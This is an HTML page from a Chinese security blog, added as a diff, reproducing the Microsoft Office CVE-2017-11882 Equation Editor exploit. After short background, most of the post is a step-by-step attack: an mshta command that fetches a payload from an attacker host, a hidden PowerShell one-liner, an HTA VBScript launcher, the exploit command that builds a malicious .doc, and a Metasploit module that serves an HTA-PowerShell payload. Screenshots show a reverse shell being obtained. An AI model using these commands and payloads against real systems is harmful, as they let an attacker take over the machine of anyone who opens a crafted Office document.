@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="Damit 5">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="Microsoft Office内存损坏漏洞（CVE–2017–11882) 复现"/>
+  <meta property="og:description" content="纸上得来终觉浅，绝知此事要躬行。" />
+  <meta property="og:site_name" content="Damit5&#39;s Blog"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="https://damit5.com"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Damit5's Blog</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/background.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">Microsoft Office内存损坏漏洞（CVE–2017–11882) 复现</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/damit5/">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:damit5@protonmail.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://damit5.github.io/AboutMe">
+                  
+                  AboutMe
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://damit5.github.io/Link">
+                  
+                  Friend Link
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By Damit 5</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2017-11-22</span>
+            <span class="time">17:32:32</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/渗透测试/">#渗透测试</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer3" class="aplayer" style="margin-bottom: 20px;"></div>
+		<script>
+			new APlayer({
+				element: document.getElementById("aplayer3"),
+				narrow: false,
+				autoplay: true,
+				showlrc: 0,
+				music: {
+					title: "六月的雨",
+					author: "胡歌",
+					url: "//damit5.github.io/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",
+					pic: "//damit5.github.io/Music/233.jpg",
+				}
+			});
+		</script>
+<h2 id="0x00背景"><a href="#0x00背景" class="headerlink" title="0x00背景"></a>0x00背景</h2><p>2017年11月，微软在例行系统补丁发布中，修复了一个Office远程代码执行的严重漏洞，编号CVE-2017-11882。该漏洞类型为缓冲区溢出，位为EQNEDT32.EXE组件。受害用户打开恶意的office文档时，无需交互，就可能执行恶意代码。</p>
+<p>据悉，这个组件是由Design Science Inc.开发的，后来由微软收购。该组件于2001年编译嵌入office，之后没有任何进一步的修改。所以该漏洞已存在17年之久。影响现阶段流行的所有office版本。<br><a id="more"></a></p>
+<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h2><p>EQNEDT32.EXE是用于在文档中插入和编辑方程式。插入到文档中的任何公式都是OLE对象。该组件是在OLE技术规范下设计的。首发于Microsoft Office 2000和Microsoft 2003。从Microsoft Office 2007套件开始，显示和编辑方程的方法发生了变化，虽然EQNEDT32.EXE变得过时，不过，为了保持版本兼容性，它并没有从Office套件中删除。</p>
+<p>EQNEDT32.EXE为OLE实现了一组标准的COM接口。</p>
+<ul>
+<li><p>IOleObject</p>
+</li>
+<li><p>IDataObject</p>
+</li>
+<li><p>IOleInPlaceObject</p>
+</li>
+<li><p>IOleInPlaceActiveObject</p>
+</li>
+<li><p>IpersistStorage</p>
+</li>
+</ul>
+<p>而问题的就在于IpersistStorage：Load这个位置。因为历史久远，该组件开发的时候并没有例如ASLR这样的漏洞缓解措施。利用起来更加的方便。</p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h4 id="1-生成反弹-shell-的一句话"><a href="#1-生成反弹-shell-的一句话" class="headerlink" title="1.生成反弹 shell 的一句话"></a>1.生成反弹 shell 的一句话</h4><p>生成 shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mshta.exe &quot;//192.168.9.172:8080/6QYqdXU&quot;</div></pre></td></tr></table></figure></p>
+<p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/4D27.50pEOiV2kj7.2TDwLkoI*ucTWf1s*Nd4hcL7jA!/r/dA0BAAAAAAAA" alt="1"></p>
+<h4 id="2-访问该-url-，下载文件，获取-powershell-一句话"><a href="#2-访问该-url-，下载文件，获取-powershell-一句话" class="headerlink" title="2.访问该 url ，下载文件，获取 powershell 一句话"></a>2.访问该 url ，下载文件，获取 powershell 一句话</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell.exe -nop -w hidden -e *******************</div></pre></td></tr></table></figure>
+<h4 id="3-新建文件，例如-abc"><a href="#3-新建文件，例如-abc" class="headerlink" title="3.新建文件，例如 abc"></a>3.新建文件，例如 abc</h4><p>将 <code>calc.exe</code> 换成上面的 <code>powershell</code> 一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;HTML&gt; </div><div class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</div><div class="line">&lt;HEAD&gt; </div><div class="line">&lt;script language=&quot;VBScript&quot;&gt;</div><div class="line">Window.ReSizeTo 0, 0</div><div class="line">Window.moveTo -2000,-2000</div><div class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</div><div class="line">objShell.Run &quot;calc.exe&quot;</div><div class="line">self.close</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;body&gt;</div><div class="line">demo</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/HEAD&gt; </div><div class="line">&lt;/HTML&gt;</div></pre></td></tr></table></figure>
+<p>大概长这样<br><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/E3VPexI*az4l2foBt5E5He496qZbQFK8PrrlB.ZZFlw!/r/dG4AAAAAAAAA" alt="2"></p>
+<h4 id="4-将该文件上传到-var-www-html-目录下，并开启-apache-服务器"><a href="#4-将该文件上传到-var-www-html-目录下，并开启-apache-服务器" class="headerlink" title="4.将该文件上传到 /var/www/html/ 目录下，并开启 apache 服务器"></a>4.将该文件上传到 <code>/var/www/html/</code> 目录下，并开启 apache 服务器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service apache2 start</div></pre></td></tr></table></figure>
+<h4 id="5-利用-exp-生成-doc"><a href="#5-利用-exp-生成-doc" class="headerlink" title="5.利用 exp 生成 doc"></a>5.利用 exp 生成 doc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python Command_CVE-2017-11882.py -c &quot;mshta //192.168.9.172/abc&quot; -o test.doc</div></pre></td></tr></table></figure>
+<h4 id="6-开启-msf-监听"><a href="#6-开启-msf-监听" class="headerlink" title="6.开启 msf 监听"></a>6.开启 msf 监听</h4><p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/LJpq7rg04pt97g9FtsCGynVyNs9H8grkIOZYDJmXImY!/r/dA0BAAAAAAAA" alt="3"></p>
+<h4 id="7-打开-doc"><a href="#7-打开-doc" class="headerlink" title="7.打开 doc"></a>7.打开 doc</h4><p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/0MBrKpl.YtV09EHL8aG1WcIEXsow9pf4ujZSQeA7Y5k!/r/dN4AAAAAAAAA" alt="5"></p>
+<h4 id="8-成功获得-shell"><a href="#8-成功获得-shell" class="headerlink" title="8.成功获得 shell"></a>8.成功获得 shell</h4><p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/eGvsprElZowK8KL0D2S1qd9VzAj6C.ExzbG7ytyyDWo!/r/dIUBAAAAAAAA" alt="4"></p>
+<h2 id="0x03-参考文档"><a href="#0x03-参考文档" class="headerlink" title="0x03 参考文档"></a>0x03 参考文档</h2><p>//bobao.360.cn/learning/detail/4734.html</p>
+<p><a href="https://github.com/Ridter/CVE-2017-11882" target="_blank" rel="external">https://github.com/Ridter/CVE-2017-11882</a></p>
+<p><code>PS_shell.rb</code> 内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">##</div><div class="line"># This module requires Metasploit: https://metasploit.com/download</div><div class="line"># Current source: https://github.com/rapid7/metasploit-framework</div><div class="line">##</div><div class="line"></div><div class="line"></div><div class="line">class MetasploitModule  &lt; Msf::Exploit::Remote</div><div class="line">  Rank = NormalRanking</div><div class="line"></div><div class="line">  include Msf::Exploit::Remote::HttpServer</div><div class="line"></div><div class="line">  def initialize(info  = &#123;&#125;)</div><div class="line">    super(update_info(info,</div><div class="line">      &apos;Name&apos; =&gt; &apos;Microsoft Office Payload Delivery&apos;,</div><div class="line">      &apos;Description&apos; =&gt; %q&#123;</div><div class="line">        This module generates an command to place within</div><div class="line">        a word document, that when executed, will retrieve a HTA payload</div><div class="line">        via HTTP from an web server. Currently have not figured out how</div><div class="line">        to generate a doc.</div><div class="line">      &#125;,</div><div class="line">      &apos;License&apos; =&gt; MSF_LICENSE,</div><div class="line">      &apos;Arch&apos; =&gt; ARCH_X86,</div><div class="line">      &apos;Platform&apos; =&gt; &apos;win&apos;,</div><div class="line">      &apos;Targets&apos; =&gt;</div><div class="line">        [</div><div class="line">          [&apos;Automatic&apos;, &#123;&#125; ],</div><div class="line">        ],</div><div class="line">      &apos;DefaultTarget&apos; =&gt; 0,</div><div class="line">    ))</div><div class="line">  end</div><div class="line"></div><div class="line">  def on_request_uri(cli, _request)</div><div class="line">    print_status(&quot;Delivering payload&quot;)</div><div class="line">    p = regenerate_payload(cli)</div><div class="line">    data = Msf::Util::EXE.to_executable_fmt(</div><div class="line">      framework,</div><div class="line">      ARCH_X86,</div><div class="line">      &apos;win&apos;,</div><div class="line">      p.encoded,</div><div class="line">      &apos;hta-psh&apos;,</div><div class="line">      &#123; :arch =&gt; ARCH_X86, :platform =&gt; &apos;win &apos;&#125;</div><div class="line">    )</div><div class="line">    send_response(cli, data, &apos;Content-Type&apos; =&gt; &apos;application/hta&apos;)</div><div class="line">  end</div><div class="line"></div><div class="line"></div><div class="line">  def primer</div><div class="line">    url = get_uri</div><div class="line">    print_status(&quot;Place the following DDE in an MS document:&quot;)</div><div class="line">    print_line(&quot;mshta.exe \&quot;#&#123;url&#125;\&quot;&quot;)</div><div class="line">  end</div><div class="line">end</div></pre></td></tr></table></figure></p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
